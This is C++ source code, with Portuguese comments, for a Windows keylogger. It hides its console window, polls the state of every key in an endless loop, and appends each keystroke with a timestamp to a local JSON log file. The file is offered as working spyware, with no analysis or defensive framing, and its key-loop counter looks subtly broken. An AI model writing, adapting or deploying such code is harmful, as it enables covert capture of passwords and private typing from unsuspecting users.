#include <iostream>
#include <windows.h>
#include <fstream>
#include <json/json.h> // Inclui a biblioteca JSON

using namespace std;

int Save(int _key, const char* file);

int main() {
    FreeConsole(); // Esconde o console

    char i;
    while (true) {
        Sleep(10);
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                Save(i, "log.json"); // Salvar no arquivo JSON
            }
        }
    }

    return 0;
}

int Save(int _key, const char* file) {
    Json::Value logEntry;
    string keyStr;

    // Definir as representações das teclas
    switch (_key) {
    case VK_SHIFT: keyStr = "[SHIFT]";
        break;
    case VK_BACK: keyStr = "[BACKSPACE]";
        break;
    case VK_LBUTTON: keyStr = "[LBUTTON]";
        break;
    case VK_RBUTTON: keyStr = "[RBUTTON]";
        break;
    case VK_RETURN: keyStr = "[ENTER]";
        break;
    case VK_TAB: keyStr = "[TAB]";
        break;
    case VK_ESCAPE: keyStr = "[ESCAPE]";
        break;
    case VK_CONTROL: keyStr = "[Ctrl]";
        break;
    case VK_MENU: keyStr = "[Alt]";
        break;
    case VK_CAPITAL: keyStr = "[CAPS LOCK]";
        break;
    case VK_SPACE: keyStr = "[SPACE]";
        break;
    default: keyStr = string(1, _key); // Se não for tecla especial, grava o caractere
        break;
    }

    // Carregar o arquivo JSON existente, se houver
    ifstream inputFile(file, ifstream::binary);
    Json::Value logData;
    Json::CharReaderBuilder builder;
    string errs;

    if (inputFile.is_open()) {
        bool parsingSuccessful = Json::parseFromStream(builder, inputFile, &logData, &errs);
        inputFile.close();
    }

    // Adicionar nova entrada de log
    logEntry["key"] = keyStr;
    logEntry["timestamp"] = static_cast<unsigned int>(time(0)); // Adiciona o timestamp do evento

    logData.append(logEntry); // Adiciona a nova entrada ao array de logs

    // Salvar o arquivo JSON atualizado
    ofstream outputFile(file, ofstream::binary);
    Json::StreamWriterBuilder writer;
    writer["indentation"] = "  "; // Configurar a indentação
    outputFile << Json::writeString(writer, logData);
    outputFile.close();

    return 0;
}
